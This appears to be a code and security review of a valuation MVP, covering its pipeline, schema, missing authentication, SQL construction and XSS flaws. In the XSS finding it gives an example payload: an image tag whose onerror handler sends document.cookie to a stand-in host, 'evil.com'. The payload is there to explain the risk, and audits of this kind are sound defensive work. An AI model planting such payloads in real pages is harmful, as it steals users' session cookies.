# Architecture Review — valuation-mvp

**Date:** 2026-03-25
**Reviewer:** Claude (senior dev + architect review)
**Scope:** Full codebase — backend, frontend, database, integrations, security

---

## 1. Code Quality

### What is well written

- **Value engine orchestration** (`value_engine.py`) — the pipeline is explicit, readable, and has clearly separated concerns: vision, market, scoring, pricing. The status flow (ok/ambiguous/insufficient/degraded/error) is consistent and well thought-out. Each branch produces a complete response payload with debugging context.

- **Comparable scoring** (`comparable_scoring.py`) — poison pattern detection, Osmo-specific logic, accessory/bundle filtering are thorough. The `ComparableScore` and `ComparableAdjustment` dataclasses give structure to what could easily be a mess of floats.

- **Vision service confidence capping** (`vision_service.py:565-609`) — the layered confidence caps (text evidence, concrete evidence, single image, multiple alternatives, conflicts) are a smart safety net that prevents the model from overconfident hallucinations.

- **Error reporting** — `error_reporting.py` generates structured artifacts with debug IDs, stages, and fix prompts. This is mature for an MVP.

- **Tradera client** (`tradera_client.py`) — handles XML parsing gracefully with both namespaced and tolerant fallback paths, rate-limit caching, and proper error handling.

- **Admin dashboard** (`admin.html`) — clean, functional, responsive. Sparklines, skeleton loaders, auto-refresh. Surprisingly polished for an MVP.

### What is messy or inconsistent

- **value_engine.py is 855 lines** — it contains 15+ free functions, the `ValueEngine` class, and all response dict construction. The `value_item` method alone is ~330 lines of nested dict literals. These response dicts are constructed manually 4 times (ambiguous, insufficient, degraded, ok) with near-identical field sets. One missed field = silent bug.

- **Dict-passing everywhere** — the core pipeline passes `dict[str, Any]` between layers instead of typed objects. `pricing_result`, `market_data`, `new_price_data` are all untyped dicts. The Pydantic models in `value.py` only validate the *response*, not the internal pipeline state. This means:
  - No IDE autocomplete through the pipeline
  - No compile-time guarantees that fields exist
  - Bugs manifest as `KeyError` in production, not at import time

- **Two logging styles** — `tradera_client.py:9` uses `logging.getLogger(__name__)` while every other file uses `get_logger(__name__)`. The centralized logger (`utils/logger.py`) provides JSON formatting and request_id propagation, so the Tradera client misses both.

- **Sync endpoint calls async background task** — `value_image` in `value.py:396` is a sync `def`, but `_persist_valuation` is `async def`. FastAPI handles this, but it's confusing and means the main valuation pipeline runs in a threadpool rather than the async event loop, blocking a worker thread per request during OpenAI/Tradera calls.

- **market_service.py vs market_data_service.py** — two files with overlapping names. `MarketService` wraps `MarketDataService`. The indirection adds no value at this stage.

### Technical debt that will slow you down

1. **No type safety through the pipeline** — every feature change requires manually tracing dict keys across 4+ files. This is the #1 velocity killer as complexity grows.

2. **Massive inline dict construction in value_engine.py** — adding a field to the response means editing 4 nearly-identical blocks. Extract a `build_response_payload()` helper or use a dataclass.

3. **Frontend is a 31,000-token single file** — index.html contains CSS, HTML, and ~800 lines of JS. Any UI change requires reading the entire file. No component structure, no build step.

4. **No async HTTP client** — `vision_service.py` and `tradera_client.py` use synchronous `requests`. In a FastAPI async app, these block the worker thread. Should use `httpx.AsyncClient`.

5. **In-memory cache** (`utils/cache.py`) — works fine for a single dyno, but will cause inconsistency with >1 instance. No cache invalidation strategy.

---

## 2. Architecture

### Does the structure support the long-term vision?

The current architecture is **a solid MVP** but will not survive the transition to a B2B data platform without significant refactoring.

**What works for now:** The pipeline flow (vision → market → scoring → pricing) is conceptually clean. The separation between integrations and services is good. The DB schema captures the right core entities.

**What will break when you scale:**

1. **Single-process, synchronous pipeline** — a valuation request makes 3-5 external API calls (OpenAI, Tradera, Blocket, Serper, SerpAPI) synchronously. At 10 concurrent users, you'll exhaust worker threads. The market_data_service does Tradera calls sequentially with progressive fallback — up to 5 queries per request.

2. **No queue/worker architecture** — valuations are request-response. For B2B (batch valuations, scheduled price monitoring, cron workers), you need a task queue (Celery, Dramatiq, or at minimum a simple DB-backed job queue). The `PriceSnapshot` model has a `source` field for "cron_worker" but no cron worker exists.

3. **No multi-tenancy** — no concept of user, organization, API key, or rate limit. The schema has no `tenant_id`. Adding this later means migrating every table.

4. **No API versioning** — the `/value` endpoint returns a complex envelope. Any breaking change will break all consumers simultaneously.

5. **Single-file frontend** — cannot be maintained by a team, cannot be tested, cannot be deployed independently.

### Missing abstractions

- **Response builder** — the 4 response construction blocks in value_engine.py should be a single function that takes status + components and builds the full envelope.
- **Pipeline context object** — a typed object that accumulates results through the pipeline (identification → market data → scoring → pricing) instead of loose dicts.
- **Integration interface/protocol** — `TraderaClient`, `BlocketClient`, `SerpApiUsedMarketClient` have different APIs (`.search(query)` vs `.search(brand=, model=)`). A shared protocol would make adding new market sources trivial.
- **Rate limiter** — no request rate limiting. A single bad actor can drain your OpenAI budget.

---

## 3. Database

### Schema assessment

The schema is **adequate for an MVP** but not for a data platform.

**What's good:**
- `Valuation` captures the full result lifecycle including feedback
- `PriceSnapshot` enables time-series price tracking
- JSONB `sources_json` is flexible for heterogeneous source data
- Indexes on `product_identifier`, `product_name`, `created_at`

### Missing tables

| Table | Purpose |
|-------|---------|
| `products` | Normalized product catalog — currently products are identified by string matching. A canonical product table with `brand + model + category` would enable aggregation, deduplication, and trend analysis |
| `market_listings` | Raw listing data from Tradera/Blocket. Currently discarded after each request. Storing them enables trend analysis, data training, and avoids re-fetching |
| `api_keys` / `tenants` | Multi-tenancy for B2B |
| `valuation_requests` | Request audit log separate from results (tracks who asked, when, what images) |

### Missing fields on existing tables

- `Valuation.condition` — the request accepts `condition` but it's not persisted to the DB
- `Valuation.request_images_count` — useful for analytics (does more images = higher confidence?)
- `Valuation.response_time_ms` — critical for monitoring
- `PriceSnapshot.condition` — price snapshots don't track condition context

### Indexing issues

- `Valuation.status` has no index — the admin metrics query does `GROUP BY status` on every page load
- `Valuation.brand` has no index — `GROUP BY brand` in admin metrics will sequential scan
- `PriceSnapshot` has no composite index on `(product_identifier, snapshot_date)` — the primary query pattern for trend data

### Schema concern

- `models.py:14` uses `datetime.utcnow` as default — this is deprecated in Python 3.12+ and doesn't set timezone. Use `datetime.now(UTC)` instead.
- `models.py:13` uses `String` for primary key with UUID default — works but `UUID` column type would be more efficient and self-documenting.

---

## 4. Security

### SQL injection in admin router

**`admin.py:270-273`** — the table browser endpoint constructs SQL with f-strings:

```python
total = await _fetchval(f'SELECT COUNT(*) FROM "{table_name}"')
rows = await _fetch(
    f'SELECT * FROM "{table_name}" ORDER BY "{order_by}" {direction} LIMIT $1 OFFSET $2',
    limit, offset,
)
```

The `table_name` is validated against `information_schema.tables` (line 254-258), and `order_by` is validated against column names (line 266), so the injection surface is limited. However, the validation-then-use pattern is fragile — a TOCTOU race or a future refactor that removes the check would open a direct SQL injection. Use parameterized identifiers or a whitelist approach.

### XSS via innerHTML in admin dashboard

**`admin.html:580-588`** — the table browser renders cell values with `innerHTML`:

```javascript
body.innerHTML = data.rows.map(row =>
  "<tr>" + row.map(cell =>
    cell === null
      ? `<td><span class="adm-null">null</span></td>`
      : `<td>${String(cell)}</td>`
  ).join("") + "</tr>"
).join("");
```

If any DB cell contains `<script>alert('xss')</script>` or `<img onerror=...>`, it will execute. Column headers (`admin.html:580`) have the same issue. Should use `textContent` or escape HTML.

### XSS via innerHTML in main frontend

**`frontend/index.html`** — multiple uses of `innerHTML` with API response data. The comparable titles, brand names, and model names from Tradera/Blocket are user-generated marketplace data injected into the DOM. Any listing with malicious content in its title would execute JS in the user's browser. This is the highest-severity finding.

### Admin dashboard has no authentication

**`admin.py:4`** explicitly states: "No auth enforced here." The admin endpoints expose:
- Full database schema and table contents (`/admin/table/{name}`)
- Database connection counts and server version
- All valuation data including user feedback

Anyone who discovers the `/admin` path has full read access to the database. In production, this is a data breach waiting to happen.

### CORS allows all origins

**`main.py:49-54`** — `allow_origins=["*"]` means any website can make API requests to your backend and read the responses. Combined with the admin endpoints, this means a malicious page could exfiltrate your entire database via JavaScript fetch calls.

### OpenAI API key in memory

**`vision_service.py:255`** — the API key is stored as a plain string attribute on the service instance. This is standard practice, but worth noting: any memory dump, debug endpoint, or error serialization that includes the service object will leak the key.

---

## 5. The Biggest Risks

### Top 3 things that could kill this product

1. **No authentication anywhere** — the admin dashboard exposes raw DB access over the internet. The main API has no rate limiting and no API keys. A competitor, bot, or bad actor can drain your OpenAI budget (~$0.01-0.05 per vision call) in minutes, steal all your valuation data, or inject XSS payloads via marketplace data that gets rendered in users' browsers.

2. **Synchronous blocking pipeline with no queue** — each valuation request holds a worker thread for 5-15 seconds (OpenAI timeout alone is 30s). With Railway's default of 1-2 workers, 3 concurrent users will see timeouts. For B2B (batch valuations, price monitoring), you need async processing. This is an architecture-level problem that gets harder to fix the longer you wait.

3. **No off-machine backup** — the project has no GitHub remote pushed. If the laptop dies, everything is gone. The database (when it works) is fire-and-forget with no backup strategy. For a product handling business data, this is existential risk.

### Top 3 things that are better than expected

1. **Pipeline intelligence** — the confidence capping system, comparable scoring, poison pattern detection, Osmo variant logic, and preliminary estimate fallback are genuinely sophisticated. This is the kind of domain logic that takes months to tune. The "honest refusal > misleading number" principle is baked in at every layer.

2. **Error handling and observability** — structured logging with request IDs, per-error debug artifacts, 5 distinct response states with user-facing Swedish copy, evidence summaries, and a functional admin dashboard. This is production-grade observability for an MVP.

3. **Market data resilience** — the progressive fallback strategy (Blocket primary → Tradera progressive → SerpAPI fallback), rate-limit caching, color word stripping, model alias generation, and per-source deduplication show real-world testing against messy marketplace data. The system degrades gracefully rather than failing.

---

## 6. Recommended Next Steps

### Priority order — the 5 most important changes

**1. Authentication + rate limiting**
- **Files:** `backend/app/main.py`, new file `backend/app/middleware/auth.py`
- **Change:** Add API key middleware for `/value` and `/feedback`. Add basic auth or IP whitelist for `/admin/*`. Add per-IP rate limiting (e.g., slowapi or simple in-memory counter).
- **Why:** Without this, you cannot deploy to production safely. One bot = drained OpenAI budget. One curious visitor = full DB read access. This is the single highest-risk item.

**2. Fix XSS in both frontends**
- **Files:** `frontend/index.html` (innerHTML with marketplace data), `frontend/admin.html:580-588` (innerHTML with DB cell values)
- **Change:** Replace `innerHTML` with `textContent` for all user/marketplace-sourced data. Use a `sanitize()` helper for any remaining innerHTML usage.
- **Why:** Marketplace listing titles are attacker-controlled input. A malicious Tradera listing title like `<img src=x onerror=fetch('evil.com?c='+document.cookie)>` would execute in every user's browser.

**3. Wrap `_persist_valuation` in try/except**
- **File:** `backend/app/api/value.py:339-392`
- **Change:** Wrap the entire function body in `try: ... except Exception: logger.error(...)`. The docstring says "Never raises" but the dict-parsing code (lines 341-378) has no protection.
- **Why:** A single unexpected None or missing key silently kills the background task. You lose all DB persistence with no log entry, no alert, no trace.

**4. Push to GitHub**
- **Action:** Complete `gh auth login`, push all branches
- **Why:** The entire codebase exists on one machine. Every hour without remote backup is existential risk to the project.

**5. Type the pipeline with dataclasses**
- **Files:** `backend/app/core/value_engine.py`, new file `backend/app/schemas/pipeline.py`
- **Change:** Create `PipelineContext`, `MarketResult`, `PricingResult` dataclasses. Replace the 4 inline dict construction blocks with a single `build_envelope(status, context)` function.
- **Why:** This is the #1 velocity improvement. Every future feature (condition tracking, batch valuations, new market sources) requires touching these dicts. Typed objects catch errors at write-time instead of production-time, enable IDE support, and reduce the 4x copy-paste pattern to 1 function.
